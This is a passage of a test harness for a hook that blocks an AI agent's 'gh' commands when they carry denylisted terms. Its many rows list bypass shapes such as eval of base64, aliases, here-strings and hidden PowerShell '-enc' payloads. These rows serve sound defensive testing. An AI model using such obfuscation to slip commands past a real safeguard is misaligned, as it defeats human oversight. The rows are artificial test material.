gb("DENY", "eval \"$(echo Z2g= | base64 -d) issue comment 1 -b " + TA + "\"", "gh spelled by a decoded string inside eval", { msg: "command string built from an expansion" });
gb("DENY", "cp clean.md f.md; gh issue comment 1 -F f.md", "BYPASS 16 - cp changing a file in the same command", MB);
gb("DENY", "mv dirty.md f.md; gh issue comment 1 -F f.md", "BYPASS 16 - mv", MB);
gb("DENY", "sed -i s/a/b/ f.md; gh issue comment 1 -F f.md", "BYPASS 16 - sed -i", MB);
gb("DENY", "echo ${x:-'}'} ; gh issue comment 1 -b " + TA + " ; echo '", "a parameter expansion whose default holds quotes would desynchronise the lexer: refused as unparseable", { msg: "could not parse" });
gb("DENY", "echo $((1+1)); gh issue comment 1 -b " + TA, "an arithmetic expansion: refused as unparseable", { msg: "could not parse" });
gb("DENY", "gh issue comment 1 --body \"never closed", "a gh command that cannot be parsed blocks", { msg: "could not parse" });
gb("DENY", "gh frobnicate && gh pr view 1", "an unknown gh command inside a compound command blocks", { msg: "a command this scan does not know" });
gb("DENY", "gh gist create f.txt && echo ok", "a hard-blocked verb inside a compound command", { msg: "gh gist: a verb this scan does not know" });
gb("DENY", "gh workflow run x.yml; gh run list", "workflow run inside a compound command", { msg: "gh workflow: a verb this scan does not know" });
gb("DENY", "$GH issue create --title t -F clean.md", "UNRESOLVABLE: a command name built from a variable cannot be judged", { msg: "built from an expansion" });
gb("DENY", "make-notes | gh issue comment 5 -F -", "a pipe from another command", MB);
gb("DENY", "gh issue comment 5 --body \"$BODY\"", "a shell variable as a body", MB);

gb("DENY", "g" + BSL + NL + "h issue comment 1 -b " + TA, "a gh word split by a backslash-newline continuation", MB);
gb("DENY", "alias g=gh; g issue comment 1 -b " + TA, "an alias for gh defined in the same command", { msg: "an alias for gh would hide" });
gb("DENY", "gh.cmd issue comment 1 -b " + TA, "a gh.cmd shim is still gh", MB);
gb("ALLOW", "echo done; gh issue ls --search " + TA + " | head -3", "a read in a compound command with a term-bearing search", { dl: "missing" });

gb("DENY", "gh api graphql -f query='mutation { addComment(input: {body: \"bows" + BSL + "u0070rit-ledger\"}) { x } }'",
  "a GraphQL document with a backslash-u escape: the server decodes it AFTER the scan reads the text - fails if api fields are scanned only as written", { msg: "(unescaped), line 1" });
gb("DENY", "gh api graphql -f query='mutation { a(b: \"bowsprit" + BSL + "u002dledger\") { x } }'", "the hyphen of the first term written as an escape", { msg: "(unescaped), line 1" });
gb("DENY", "gh release create v1 --title t --notes-file clean.md './a.zip#" + TA + "'", "a release asset LABEL (path#label) is published text", { msg: "asset label, line 1" });
gb("DENY", "gh release upload v1 './a.zip#" + TA + "'", "release upload: the same label", { msg: "asset label, line 1" });
gb("DENY", "true && gh release upload v1 './a.zip#" + TA + "'", "a label on release upload in a compound command", MB);
gb("ALLOW", "gh release upload v1 ./a.zip", "release upload with no label (the asset bytes are out of scope)");
gb("DENY", "function g { gh \"$@\"; }; g issue comment 1 -b " + TA, "a shell function forwarding its arguments to gh: the gh is followed by an expansion", { msg: "not statically known" });
gb("DENY", "trap 'gh issue comment 1 -b " + TA + "' EXIT", "trap runs a command string", { msg: "a command string that mentions gh" });
gb("DENY", "at now <<< 'gh issue comment 1 -b " + TA + "'", "a here-string handed to a host", { msg: "reads its commands from a heredoc" });
gb("DENY", "$SHELL -c 'gh issue comment 1 -b " + TA + "'", "a command name built from a variable, handed a command string", { msg: "followed by a gh command and verb" });
gb("DENY", "shopt -s expand_aliases; alias g='gh'; g issue comment 1 -b " + TA, "expand_aliases plus an alias", { msg: "an alias for gh would hide" });
gb("ALLOW", "gh pr view 9 --json body --jq .body | node scripts/x.js", "a read piped into a script: a node with a script argument is not an interpreter reading code from the pipe", { dl: "missing" });
gb("DENY", "gh pr view 9 --json body --jq .body | node", "node reading its code from a pipe, in a command that mentions gh", { msg: "reads its commands from a heredoc" });

// Shapes found by a differential fuzz against real bash (a stub gh on PATH; every command in which bash ran it must be blocked)
gb("DENY", "x='gh issue comment 1 -b " + TA + "'; $x", "a variable holding a whole gh command, then run through the variable", { msg: "a variable that holds a gh command" });
gb("DENY", "a=(gh issue comment 1 -b " + TA + "); \"${a[@]}\"", "an array holding a gh command", { msg: "an array that holds a gh command" });
gb("DENY", "read -r c <<< 'gh issue comment 1 -b " + TA + "'; $c", "read from a here-string, then run", { msg: "reads its commands from a heredoc" });
gb("DENY", "cat > s.sh <<'EOF'" + NL + "gh issue comment 1 -b " + TA + NL + "EOF" + NL + "bash s.sh", "a script written and run in one call", { msg: "runs a script file in a call that also holds a gh command as text" });
gb("DENY", "cat > s.sh <<'EOF'" + NL + "g${y}h issue comment 1 -b " + TA + NL + "EOF" + NL + "bash s.sh", "the same with an obfuscated gh word in the script", { msg: "runs a script file in a call that also holds a gh command as text" });
gb("DENY", "source <(echo 'gh issue comment 1 -b " + TA + "')", "source of a process substitution", { msg: "reads its commands from a heredoc" });
gb("DENY", "git -c alias.x='!gh issue comment 1 -b " + TA + "' x", "a git alias that runs gh", { msg: "a git alias" });
gb("DENY", "case x in x) $(echo gh) issue comment 1 -b " + TA + " ;; esac", "the closing parenthesis of a case pattern ends the pattern segment", { msg: "built from an expansion" });
gb("DENY", "echo $((1+1)); g$()h issue comment 1 -b " + TA, "an unparseable construct in a command with a glued gh word (no gh text at all) blocks", { msg: "could not parse" });
gb("DENY", "function f { $'" + BSL + "x67h' issue comment 1 -b " + TA + "; }; f", "an ANSI-C spelled gh inside a function body", { msg: "built from an expansion" });
gb("ALLOW", "git commit -m \"gh issue create: handle flags\"", "a commit message that is itself a gh-shaped phrase is data, not an invocation", { dl: "missing" });

// ===== PowerShell tool ===========================================================================
gp("DENY", (x) => "gh issue comment 5 --body-file " + NP(x, "dirty.md"), "CONTROL - PowerShell entry, a native single-quoted path with backslashes; fails if the PowerShell tool_name is not scanned or backslashes are mangled by the bash -> node hand-off", { msg: "--body-file (file contents), line 3" });
gp("DENY", "gh issue comment 5 -F dirty.md", "a relative path on the PowerShell entry", { msg: "(file contents), line 3" });
gp("DENY", (x) => "gh issue comment 5 --body-file \"" + NATIVE(x, "dirty.md") + "\"", "a native backslash path in DOUBLE quotes (a backslash is literal in PowerShell)", { msg: "(file contents), line 3" });
gp("DENY", (x) => "gh issue comment 5 --body-file " + NATIVE(x, "dirty.md"), "a bare native path", { msg: "(file contents), line 3" });
gp("DENY", "gh issue create --title '" + TA + "' --body-file clean.md", "a single-quoted title", { msg: "gh issue create --title, line 1" });
gp("DENY", "gh issue create --title \"" + TA + "\" --body-file clean.md", "a double-quoted title", { msg: "gh issue create --title, line 1" });
gp("DENY", "gh issue create --title='" + TA + "' --body-file clean.md", "--title='...'", { msg: "gh issue create --title, line 1" });
gp("DENY", "gh api repos/o/r/issues -f title='" + TA + "'", "a PowerShell gh api -f value", { msg: "gh api -f #1" });
gp("DENY", "gh issue comment 5 --body ok", "an inline body is refused on this entry too", MI);
gp("DENY", "gh issue create --title 'x' --body '" + TA + "'", "an inline single-quoted body", MI);
gp("DENY", "gh pr create -dt '" + TA + "' -F clean.md", "the cluster walk on the PowerShell entry", { msg: "gh pr create --title, line 1" });
gp("DENY", "gh issue create --title 'a " + String.fromCharCode(0x201c) + "b' --body-file clean.md",
  "a typographic double quote inside a single-quoted string: Windows PowerShell 5.1 drops double-quote characters from a native command line (verified on 5.1 and 7.7), which could split a term", MB);
gp("DENY", "gh issue create --title 'a \"b\"' --body-file clean.md", "an ASCII double quote inside a single-quoted string - the same hazard", MB);
gp("DENY", "gh issue create --title \"a $b\" --body-file clean.md", "a double-quoted title holding a variable", MB);
gp("DENY", "gh issue create --title \"a " + BT2 + "u{62} b\" --body-file clean.md", "BYPASS 9 - a backtick escape in a double-quoted string", MB);
gp("DENY", "gh issue comment 1 -b \"" + BT2 + "u{62}owsprit-ledger\"", "BYPASS 9 - the backtick-u escape spelling the term", MB);
gp("DENY", "gh issue comment 1 -b @\"" + NL + BT2 + "u{62}owsprit-ledger" + NL + "\"@", "BYPASS 9 - a double-quoted here-string with an escape", MB);
gp("DENY", "gh issue comment 1 -b @'" + NL + TA + NL + "'@", "a single-quoted here-string as the body", MB);
gp("DENY", "@'" + NL + "l1" + NL + TB + NL + "'@ | gh issue comment 5 --body-file -", "a here-string piped to --body-file -", MB);
gp("DENY", "gh issue comment 1 --body " + BT2 + NL + "   '" + TA + "'", "BYPASS 1 - a backtick-continued --body", MB);
gp("DENY", "gh issue comment 1 <# ' #> -b '" + TA + "' <# ' #>", "BYPASS 7 - a block comment hiding a quote", MB);
gp("DENY", "<# ' #> gh issue create -b '" + TA + "' # '", "BYPASS 7 - a block comment hiding the opening quote of a string that swallows the gh word", MB);
gp("DENY", "gh issue comment 1 -b (\"bowsprit-\"+\"ledger\")", "BYPASS 8 - a PowerShell string expression", MB);
gp("DENY", "gh issue comment 1 -b ('bowsprit-' + 'ledger')", "BYPASS 8 - single-quoted pieces", MB);
gp("DENY", "gh issue comment 5 --body (Get-Content -Raw dirty.md)", "(Get-Content -Raw file) as the body", MB);
gp("DENY", "gh issue comment 5 --body-file $path", "a PowerShell variable as the path", MB);
gp("DENY", "$b = 'x'; gh issue comment 5 --body $b", "a body variable", MB);
gp("DENY", (x) => "Set-Content -Path " + NP(x, "p.md") + " -Value '" + TA + "'; gh issue comment 5 --body-file " + NP(x, "p.md"), "a file written by Set-Content in the same command", MB);
gp("DENY", "Add-Content a.md 'bowsprit-'; Add-Content a.md 'ledger'; gh issue comment 1 -F a.md", "BYPASS 5 - Add-Content", MB);
gp("DENY", "& \"C:" + BSL + "Program Files" + BSL + "GitHub CLI" + BSL + "gh.exe\" issue comment 5 --body-file clean.md", "the call operator with a full path to gh.exe: not the strict form", MB);
gp("DENY", "& 'gh' issue comment 5 --body-file clean.md", "the call operator", MB);
gp("DENY", "& ('g'+'h') issue comment 1 -b '" + TA + "'", "BYPASS 15 - the command word built by a PowerShell expression", { msg: "built from an expansion" });
gp("DENY", "& (\"g\"+\"h\") issue comment 1 -b '" + TA + "'", "the same with double quotes", { msg: "built from an expansion" });
gp("DENY", "pwsh -Command \"gh issue comment 1 -b '" + TA + "'\"", "BYPASS 14 - pwsh -Command with a string", { msg: "a command string that mentions gh" });
gp("DENY", "iex \"gh issue comment 1 -b '" + TA + "'\"", "BYPASS 14 - Invoke-Expression", { msg: "a command string that mentions gh" });
gp("DENY", "pwsh -EncodedCommand Z2ggaXNzdWUgY29tbWVudCAxIC1iIHg=", "BYPASS 14 - an encoded command (no gh word anywhere: the shape of the command is what is refused)", { msg: "-EncodedCommand hides the command" });
const ENC = Buffer.from("gh issue comment 1 --body " + TA, "utf16le").toString("base64");
["-enc", "-en", "-e", "-ec", "-enco", "-EncodedC", "-ENC", "--enc", "/enc", "/e", "-encodedcommand", "-NoProfile -en", "-nop -w hidden -enc"].forEach((f) => {
  ["pwsh", "pwsh.exe", "powershell"].forEach((c) => {
    gb("DENY", c + " " + f + " " + ENC, "BYPASS 16 - an abbreviated or re-spelled -EncodedCommand (" + c + " " + f + "); fails if only the full spellings are refused", { msg: "-EncodedCommand hides the command" });
    gp("DENY", c + " " + f + " " + ENC, "BYPASS 16 - the same on the PowerShell entry (" + c + " " + f + ")", { msg: "-EncodedCommand hides the command" });
  });
});
gp("DENY", "powershell -enc:" + ENC, "BYPASS 16 - the attached -enc:<value> form", { msg: "-EncodedCommand hides the command" });
// The 2026-11-21 rule: the call names pwsh/powershell and carries an encoded-flag token, whatever follows the flag or wraps it.
const ENCM = { msg: "-EncodedCommand hides the command" };
const LF = "\n";
[
  ["pwsh -e \"" + ENC + "\"", "a double-quoted payload"],
  ["pwsh -e '" + ENC + "'", "a single-quoted payload"],
  ["pwsh -e:\"" + ENC + "\"", "an attached quoted payload"],
  ["pwsh -e=" + ENC, "an =value suffix"],
  ["pwsh -e \\" + LF + ENC, "a line-continued payload"],
  ["pwsh -e $E", "a variable payload"],
  ["pwsh -EncodedCommand $E", "the full flag with a variable payload"],
  ["pwsh -e $(cat enc.txt)", "a command-substitution payload"],
  ["E=" + ENC + "; pwsh -e $E", "a variable set in the same call"],
  ["cmd /c pwsh -e " + ENC, "nested in cmd /c"],
  ["cmd.exe /c pwsh.exe -e " + ENC, "nested in cmd.exe /c"],
  ["cmd /c \"pwsh -e " + ENC + "\"", "nested in a quoted cmd /c string"],
  ["sh -c 'pwsh -e " + ENC + "'", "nested in sh -c"],
  ["bash -c \"pwsh -e " + ENC + "\"", "nested in bash -c"],
  ["wsl pwsh -e " + ENC, "behind wsl"],
  ["start pwsh -e " + ENC, "behind start"]
].forEach((r) => {
  gb("DENY", r[0], "encoded-flag rule: " + r[1] + "; fails if only a bare unquoted payload next to a top-level pwsh is refused", ENCM);
  gp("DENY", r[0], "encoded-flag rule (PowerShell entry): " + r[1], ENCM);
});
gp("DENY", "pwsh -e (Get-Content enc.txt)", "encoded-flag rule: a Get-Content payload", ENCM);
gp("DENY", "Start-Process pwsh -ArgumentList '-e','" + ENC + "'", "encoded-flag rule: Start-Process with an argument array", ENCM);
gp("DENY", "Start-Process pwsh -ArgumentList \"-e " + ENC + "\"", "encoded-flag rule: Start-Process with an argument string", ENCM);
// Without a pwsh/powershell word the rule must not fire.
[
  "grep -e getUserAccountName src/x.js",
  "grep -E getUserAccountNameXX src",
  "rg -e SomeLongIdentifierName",
  "git log -e abcdefghijklmnopqrstuvwx",
  "sed -e s/abcdefghijklmnopqrstuvwxyz/b/ f",
  "npm run x -- -e abcdefghijklmnopqrstuvwxyz",
  "node -e \"console.log(1)\"",
  "git commit -m \"fix the parser -e ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef\""
].forEach((c) => {
  gb("ALLOW", c, "encoded-flag rule: no pwsh/powershell word, so an -e token is an ordinary option; fails if the rule keys on the token or a base64-shaped word alone", { dl: "missing" });
  gp("ALLOW", c, "encoded-flag rule (PowerShell entry): no pwsh/powershell word", { dl: "missing" });
});
// A pwsh/powershell word BEFORE the flag, or in another segment, is not an encoded command: the flag must follow the word in one segment.
[
  "grep -E \"pwsh|powershell\" docs/x.md",
  "grep -rn -e pwsh scripts",
  "sed -e 's/pwsh/pwsh7/' f.md",
  "node -e \"console.log('pwsh')\"",
  "perl -e 'print \"powershell\"'",
  "echo -e \"pwsh ok\"",
  "echo pwsh; ls -e x",
  "echo pwsh" + LF + "sed -e s/a/b/ f"
].forEach((c) => {
  gb("ALLOW", c, "encoded-flag rule: the -e belongs to another program or segment (it does not follow the pwsh word in one segment); fails if the rule fires on the two words in any order", { dl: "missing" });
  gp("ALLOW", c, "encoded-flag rule (PowerShell entry): the -e does not follow the pwsh word in one segment", { dl: "missing" });
});
// Segment ends (; | && || newline) do not hide a real encoded command from the rule, and a coincidence in one segment still blocks (documented residue).
[
  ["echo x; pwsh -e " + ENC, "after ;"],
  ["echo x && pwsh -e " + ENC, "after &&"],
  ["echo x || pwsh -e " + ENC, "after ||"],
  ["echo x | pwsh -e " + ENC, "after a pipe"],
  ["echo x" + LF + "pwsh -e " + ENC, "after a newline"],
  ["git commit -m \"fix: pwsh gate -e flag\"", "RESIDUE: the flag follows the pwsh word in one segment by coincidence"],
  ["python -c \"print('pwsh -e')\"", "RESIDUE: the same inside a string argument"]
].forEach((r) => {
  gb("DENY", r[0], "encoded-flag rule: " + r[1], ENCM);
  gp("DENY", r[0], "encoded-flag rule (PowerShell entry): " + r[1], ENCM);
});
gp("DENY", "Start-Process gh -ArgumentList 'issue create -b " + TA + "'", "Start-Process: the argument string is one word, which no table places as a command", { msg: "a command this scan does not know" });
gp("DENY", "$u = gh issue create -t x -b '" + TA + "'", "an assignment from a gh call", MB);
gp("DENY", "if (Test-Path x) { gh issue create -b '" + TA + "' }", "gh inside a script block", MB);
gp("DENY", "gh issue edit 1 --add-assignee @me", "a bare @me splats in PowerShell, so it is not the strict form (quote it)", MB);
gp("DENY", "gh issue create --title ok --body-file C:" + BSL + "x" + BSL, "a bare word ending in a backslash", MB);
gp("DENY", (x) => "cd " + NP(x, "sub") + "; gh issue comment 5 --body-file b.txt", "BYPASS 13 - cd then a relative path on the PowerShell entry", { msg: "after a cd the file path must be absolute" });
gp("DENY", "gh frobnicate", "an unknown top-level command on the PowerShell entry", { msg: "a command this scan does not know" });
gp("DENY", "gh issue comment 5 --body-file clean.md", "CONTROL (fail closed) on the PowerShell entry - denylist missing", { dl: "missing", msg: "denylist file missing" });
gp("DENY", "gh issue comment 5 --body-file clean.md", "CONTROL (blocks on its own errors) on the PowerShell entry - scanner absent", { scanner: "absent" });
gp("ALLOW", (x) => "gh issue comment 5 --body-file " + NP(x, TA + "-clean.md"), "a term only in a native Windows PATH, single-quoted");
gp("ALLOW", "gh issue comment 5 --body-file clean.md", "CONTROL - a clean relative file");
gp("ALLOW", "gh issue comment 5 --body-file ./clean.md", "a ./ relative file");
gp("ALLOW", "gh issue create --title 'x ok' --body-file clean.md --label should", "CONTROL - clean PowerShell text");
gp("ALLOW", "gh issue create --title=\"x ok\" --body-file=clean.md", "the --flag=\"value\" form");
gp("ALLOW", "gh issue edit 1 --add-assignee '@me'", "a quoted @me");
gp("ALLOW", "gh api graphql -f query='query { viewer { login } }'", "a graphql read");
gp("ALLOW", (x) => "cd " + NP(x, "sub") + "; gh issue comment 5 --body-file " + NP(x, "clean.md"), "cd then an absolute native path");
gp("ALLOW", "gh issue view 5", "read-only gh with no denylist", { dl: "missing" });
gp("ALLOW", "gh run list; gh pr checks 5", "read-only gh commands in sequence", { dl: "missing" });
gp("ALLOW", "& \"C:" + BSL + "Program Files" + BSL + "GitHub CLI" + BSL + "gh.exe\" issue view 1", "the call operator on a read-only verb", { dl: "missing" });
gp("ALLOW", "Get-ChildItem | Select-String \"gh\"", "gh as a search word, no gh command", { dl: "missing" });
gp("ALLOW", "Get-Command gh -ErrorAction SilentlyContinue", "a PowerShell lookup of gh", { dl: "missing" });
gp("DENY", "function g { gh @args }; g issue comment 1 -b '" + TA + "'", "a function forwarding @args to gh", { msg: "not statically known" });
gp("ALLOW", "gh pr view $n --json state", "a read with a PowerShell variable argument", { dl: "missing" });
gp("ALLOW", "$s = gh pr view 9 --json state --jq .state", "a read assigned to a variable", { dl: "missing" });
gp("ALLOW", "if (Test-Path x) { gh pr view 1 }", "a read inside an if block", { dl: "missing" });
gp("ALLOW", "foreach ($i in 1..3) { gh issue view $i }", "reads inside a foreach block", { dl: "missing" });
gp("DENY", "Set-Alias g gh; g issue comment 1 -b '" + TA + "'", "an alias for gh defined in the same command", { msg: "an alias for gh would hide" });

// ---------------------------------------------------------------------------------------------
// [5] Execution - bash -c is the production path, and the only authoritative one
// ---------------------------------------------------------------------------------------------

// --node-direct only: pull the script back out of `node -e '<script>'`. This exists to DEMONSTRATE
// the blindness that lets a guard ship dead (doubled backslashes survive here that collapse in the real
// bash -> node.exe argv hand-off), never to verify anything.
function scriptOf(command) {
  return command.slice(command.indexOf("node -e ") + "node -e ".length + 1, command.lastIndexOf("'"));
}

// The environment a row runs in. Only the branch-delete and closing-echo rows need one:
// `gh` is pinned to the stub via PATH + a NODE_OPTIONS preload, except for the "missing" row, which
// instead REMOVES the real GitHub CLI from PATH so the guard's spawn errors outright. If a `gh`
// survived elsewhere on that row's PATH it would answer from a fixture repo with no remote and still
// error, so the row still lands on the loud fail-open message - by a different route, which is why
// the stub rows above own the deterministic cases.
const isGhScan = (r) => r.guard.indexOf("gh-scan") === 0;

// The gh-scan rows run with CLAUDE_PROJECT_DIR set (ENV deletes it for the other guards, which fall back to
// it): at the repo for the saved command to find scripts/denylist-scan.js, or at a scriptless dir for the
// scanner-absent row. The denylist always comes from the fixture dir; an ambient DENYLIST_FILE or
// XDG_CONFIG_HOME of the person running this is overridden or removed, so the real file is never read.
function ghScanEnv(r, ctx) {
  const fx = ctx.repos.ghscan;
  const env = Object.assign({}, ENV, {
    CLAUDE_PROJECT_DIR: r.scanner === "absent" ? path.join(fx, "empty-root") : r.scanner === "hang" ? path.join(fx, "hang-root") : REPO_ROOT,
  });
  delete env.DENYLIST_FILE;
  delete env.XDG_CONFIG_HOME;
  const dl = r.dl || "ok";
  if (dl === "xdg") env.XDG_CONFIG_HOME = path.join(fx, "xdg");
  else if (dl === "home") { env.HOME = path.join(fx, "home"); env.USERPROFILE = env.HOME; }
  else env.DENYLIST_FILE = path.join(fx, dl === "missing" ? "terms-missing.txt" : dl === "empty" ? "terms-empty.txt" : "terms.txt");
  return env;
}

function envFor(row, ctx) {
  if (isGhScan(row)) return ghScanEnv(row, ctx);
  if (!row.gh) return ENV;
  if (row.gh === "missing") {
    const parts = String(ENV.PATH || "").split(path.delimiter)
      .filter((p) => p.toLowerCase().indexOf("github cli") < 0);
    return Object.assign({}, ENV, { PATH: parts.join(path.delimiter) });
  }
  return Object.assign({}, ENV, {
    PATH: ctx.ghStub.bin + path.delimiter + String(ENV.PATH || ""),
    NODE_OPTIONS: "--require \"" + ctx.ghStub.preload + "\"",
    GUARD_MATRIX_GH: row.gh,
  });
}

// Per-row time limit: a hanging guard must score as a FAILURE (status null = ERROR), never stall the run. The hang
// rows run from the temp dir so a stub that outlives the run does not hold the fixture dir open for teardown.
const ROW_LIMIT_MS = 15000;

function fire(guard, stdin, ctx, row) {
  const opts = { input: stdin, encoding: "utf8", env: envFor(row, ctx), cwd: row.scanner === "hang" ? os.tmpdir() : ctx.root,
    killSignal: "SIGKILL" };
  if (isGhScan(row)) opts.timeout = ROW_LIMIT_MS;
  if (OPT.nodeDirect && isGhScan(row)) {
    return cp.spawnSync("node", [path.join(REPO_ROOT, "scripts", "denylist-scan.js"), "--hook"], opts);
  }
  return OPT.nodeDirect
    ? cp.spawnSync("node", ["-e", scriptOf(guard.command)], opts)
    : cp.spawnSync("bash", ["-c", (row.prefix || "") + guard.command], opts);
}

function stdinFor(r, repos) {
  if (r.stdinShape === "garbage") return "not json at all {{{";
  const payload = { tool_input: { command: cmdOf(r, repos) }, cwd: repos[r.cwd] };
  if (isGhScan(r)) payload.tool_name = r.tool || (r.guard === "gh-scan-ps" ? "PowerShell" : "Bash");
  if (r.stdinShape !== "no-session") payload.session_id = SID;
  if (r.agent) { payload.agent_id = r.agent; payload.agent_type = "developer"; }
  return JSON.stringify(payload);
}

const display = (s) => s.replace(/\n/g, "\\n").replace(/\t/g, "\\t");

// Three verdicts, not two: a guard may DENY, speak without denying (WARN - the shipped
// CHANGELOG echo's posture, and the branch-delete guard's fail-open), or stay silent (ALLOW). A row
// expecting WARN would be scored green by a two-verdict runner for a guard that merely allows, which
// is the same blindness in the shape the new guards can fail in. A row may also pin `msg`, a
// substring of the guard's own text: a WARN that names the wrong branch, or a MISMATCH that never
// names the vanished heading, is not the verdict under test. Its inverse, `absent`, is a substring
// that must NOT appear - for a hook that legitimately WARNs for one reason while the clause
// under test must stay quiet.
function verdictOf(out) {
  if (out.indexOf("\"permissionDecision\":\"deny\"") >= 0) return "DENY";
  if (out.indexOf("additionalContext") >= 0) return "WARN";
  return "ALLOW";
}

// Score `rows` against `guards`. Returns the failing rows; prints one line per row.
function runRows(rows, guards, ctx) {
  const failures = [];
  for (const r of rows) {
    const guard = guards[r.guard];
    setFlag(ctx.flagFile, r.flag || "none", ctx.repos);
    if (r.state) clState(ctx.repos.changelog, r.state);
    const res = fire(guard, stdinFor(r, ctx.repos), ctx, r);
    // The gh-scan hook blocks through exit code 2 (reason on stderr); any other non-zero status is a
    // non-blocking hook error in the client, i.e. an ALLOW that must never be read as a block - so it scores
    // as ERROR, matching no expectation.
    const scan = isGhScan(r);
    const out = (res.stdout || "") + (scan && res.status === 2 ? res.stderr || "" : "");
    const observed = scan ? (res.status === 2 ? "DENY" : res.status === 0 ? "ALLOW" : "ERROR") : verdictOf(out);
    const msgMiss = !!r.msg && out.indexOf(r.msg) < 0;
    const absentHit = !!r.absent && out.indexOf(r.absent) >= 0;
    const flagAfter = r.after ? readFlag(ctx.flagFile) : null;
    const flagMiss = !!r.after && !r.after.check(flagAfter, ctx.repos);
    // No gh-scan output - block reason, stderr noise, anything - may contain a fixture term.
    const printed = (res.stdout || "") + (res.stderr || "");
    const leak = scan && (GS_TERMS.some((t) => printed.toLowerCase().indexOf(t) >= 0) ||
      pathLeaks(printed, pathForms(ctx.root)));
    const ok = observed === r.expect && !msgMiss && !absentHit && !flagMiss && !leak;
    if (!ok) failures.push(Object.assign({ observed: observed, flagMiss: flagMiss, leak: leak }, r));
    say("  " + (ok ? "PASS" : "FAIL") + " | " + r.id + " | " + r.expect.padEnd(5) + "| got " +
      observed.padEnd(5) + "| " + display(cmdOf(r, ctx.repos)).slice(0, 78));
    if (!ok) {
      say("       note: " + r.note);
      if (msgMiss) say("       missing expected text: " + r.msg + " | said: " + display(out).slice(0, 200));
      if (absentHit) say("       forbidden text present: " + r.absent + " | said: " + display(out).slice(0, 200));
      if (flagMiss) say("       flag file not as required (" + r.after.what + "): " + JSON.stringify(flagAfter).slice(0, 300));
      if (leak) say("       LEAK: the hook's output contains a fixture denylist term or fixture path");
      const err = (res.stderr || "").trim();
      if (err) say("       stderr: " + err.slice(0, 200));
    }
  }
  setFlag(ctx.flagFile, "none");
  return failures;
}

// ---------------------------------------------------------------------------------------------
// [6] The real matrix
// ---------------------------------------------------------------------------------------------

// The audit mode (`denylist-scan.js --audit`) scored against the audit stub: it is a CLI, not a saved hook
// command, so it is spawned directly. Each row states what must appear, and `exit`. A scanner that always
// exits 0 fails the dirty/error rows and one that always exits 1 fails the clean row; every row also
// asserts the fixture term never appears in its output.
const AUDIT_LOCS = ["pr #13 body line 2", "review #13 (id 903) body line 2", "release 21 body line 2", "milestone #3 description line 2"];
const AUDIT_ROWS = [
  { id: "au-d01", gh: "audit-dirty", exit: 1, has: AUDIT_LOCS,
    note: "CONTROL - planted terms in a PR body, review, release and milestone: fails if a kind is not fetched/scanned or a location is wrong" },
  { id: "au-a01", gh: "audit-clean", exit: 0, has: ["denylist audit: scanned issue 1", "denylist audit: clean"],
    note: "CONTROL - clean data exits 0 and reports a non-zero count (not blind); fails if the audit denies unconditionally or scans nothing" },
  { id: "au-d02", gh: "fail", exit: 1, has: ["ERROR gh api"],
    note: "any fetch error is non-zero - fails if a failed gh call reads as an empty, clean result" },
  { id: "au-d03", gh: "audit-clean", dl: "missing", exit: 1, has: ["denylist file missing"],
    note: "fail closed - no denylist, no audit verdict" },
];

function runAuditRows(ctx) {
  const failures = [];
  const scanner = path.join(REPO_ROOT, "scripts", "denylist-scan.js");
  for (const r of AUDIT_ROWS) {
    const env = Object.assign({}, ENV, {
      PATH: ctx.ghStub.bin + path.delimiter + String(ENV.PATH || ""),
      NODE_OPTIONS: "--require \"" + ctx.ghStub.audit + "\"",
      GUARD_MATRIX_GH: r.gh,
      GUARD_MATRIX_TERM: GS_TERMS[0],
      DENYLIST_FILE: path.join(ctx.repos.ghscan, r.dl === "missing" ? "terms-missing.txt" : "terms.txt"),
    });
    delete env.XDG_CONFIG_HOME;
    const res = cp.spawnSync("node", [scanner, "--audit", "--repo", "owner/fixture"], { encoding: "utf8", env: env });
    const all = (res.stdout || "") + (res.stderr || "");
    const missing = r.has.filter((h) => all.indexOf(h) < 0);
    const leak = GS_TERMS.some((t) => all.toLowerCase().indexOf(t) >= 0) || pathLeaks(all, pathForms(ctx.root));
    const ok = res.status === r.exit && missing.length === 0 && !leak;
    if (!ok) failures.push(Object.assign({ expect: "exit " + r.exit, observed: "exit " + res.status }, r));
    say("  " + (ok ? "PASS" : "FAIL") + " | " + r.id + " | exit " + r.exit + " | got " + res.status + " | audit " + r.gh +
      (r.dl ? " (denylist " + r.dl + ")" : ""));
    if (!ok) {
      say("       note: " + r.note);
      if (missing.length) say("       missing expected text: " + missing.join(" | ") + " | said: " + display(all).slice(0, 300));
      if (leak) say("       LEAK: the audit output contains a fixture denylist term or fixture path");
    }
  }
  return failures;
}

function runMatrix(ctx) {
  say("[1] guards resolved from " + SOURCE_LABEL.settings + " " + PATHS.settings);
  say("    and from " + SOURCE_LABEL.plugin + " " + PATHS.plugin);
  const loaded = loadGuards(PATHS);
  for (const p of loaded.problems) fail(p);
  for (const g of GUARDS) {
    const r = loaded.guards[g.key];
    if (r) pass(g.key + " at " + r.index + " (len=" + r.command.length + " sha256=" + sha12(r.command) + ")");
  }
  for (const n of loaded.notes) warn("NOT controlled here (listed in PLUGIN_UNCOVERED): " + n);
  // The two gh-scan entries must each fire for their own tool: an entry whose matcher stopped covering it
  // is a hook that never runs, which no row below could see (rows invoke the saved command directly).
  for (const g of GUARDS) {
    const r = loaded.guards[g.key];
    if (!r || !g.tool) continue;
    let covers = false;
    try { covers = new RegExp("^(?:" + r.matcher + ")$").test(g.tool); } catch (e) { covers = false; }
    if (covers) pass(g.key + " matcher \"" + r.matcher + "\" covers the " + g.tool + " tool");
    else { fail(g.key + " matcher \"" + r.matcher + "\" does not cover the " + g.tool + " tool - the hook would never fire for it"); loaded.problems.push("matcher"); }
  }
  // A hook the CLIENT times out is a non-blocking error (an ALLOW), so each gh-scan saved command must bound
  // node itself (`timeout N node ...`, expiry = non-zero = block) and its entry's own `timeout` field must sit
  // comfortably above that inner bound, so the inner one always fires first.
  for (const g of GUARDS) {
    const r = loaded.guards[g.key];
    if (!r || !g.tool) continue;
    const m = /(?:^|[;&|] *)timeout ([0-9]+) node /.exec(r.command);
    const inner = m ? Number(m[1]) : 0;
    if (!inner) { fail(g.key + " saved command does not bound node with `timeout N node` - a hang would reach the client's non-blocking timeout"); loaded.problems.push("bound"); }
    else if (!(Number(r.timeout) >= inner * 2)) { fail(g.key + " entry `timeout` (" + r.timeout + ") is not at least twice the inner bound (" + inner + " s)"); loaded.problems.push("bound"); }
    else pass(g.key + " bounds node at " + inner + " s inside the command; entry timeout " + r.timeout + " s sits above it");
  }
